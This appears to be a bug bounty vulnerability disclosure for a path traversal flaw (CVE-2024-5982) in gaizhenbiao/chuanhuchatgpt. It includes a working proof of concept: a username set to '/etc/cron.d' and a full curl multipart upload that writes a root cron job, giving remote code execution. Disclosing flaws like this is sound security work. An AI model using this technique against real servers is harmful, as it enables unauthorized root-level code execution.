@@ -1,0 +1,39 @@
+Title: Path Traversal Causes Arbitrary Upload (RCE), Arbitrary Directory Creation, and File Content Leakage (First Column of CSVs) in gaizhenbiao/chuanhuchatgpt
+
+Proof of Concept: 
+Create a user "/etc/cron.d"
+Login first.
+request this /upload with Cookies:
+
+curl -X POST -H 'sec-ch-ua-mobile: ?0' -H 'Origin: [http://127.0.0.1:7860](http://127.0.0.1:7860/)' -H 'Accept-Language: zh-CN,zh;q=0.9' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' -H 'sec-ch-ua-platform: "Windows"' -H 'Accept: */*' -H 'Sec-Fetch-Mode: cors' -H 'Cookie: access-token-XK0iqC1n6I56zluAvChAdxpubSrQtLHsWhXpDx2YuVs=Y8JI1rgI_Fvky68qYgMl-Q; access-token-unsecure-XK0iqC1n6I56zluAvChAdxpubSrQtLHsWhXpDx2YuVs=Y8JI1rgI_Fvky68qYgMl-Q; _ga_R1FN4KJKJH=GS1.1.1715020380.1.0.1715020380.0.0.0; _ga=GA1.1.550151323.1715020380; _gid=GA1.1.462705340.1715020380' -H 'Referer: http://127.0.0.1:7860/' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynnaJ7AeUseaRveRO' -H 'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Site: same-origin' -d '------WebKitFormBoundarynnaJ7AeUseaRveRO
+Content-Disposition: form-data; name="files"; filename="variables"
+Content-Type: application/json
+
+* * * * * root /bin/bash -c "echo Hello >> /var/log/test.log"
+------WebKitFormBoundarynnaJ7AeUseaRveRO--
+' 'http://127.0.0.1:7860/upload'
+
+or upload history file in ui.
+The cron file will upload to /etc/cron.d/variables, and system will execute "echo Hello >> /var/log/test.log"
+
+Impact: 
+Arbitrary Upload (RCE), Arbitrary Directory Creation, and File Content Leakage (First Column of CSVs).
+
+CVE ID: CVE-2024-5982
+Status: (assigned)
+Vulnerability Type: CWE-22: Path Traversal
+Severity: Critical (9.1)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: High
+Availability: High
+Registry: Pypi
+Affected Version: latest
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $900 to $1260
+Fix Bounty: $225
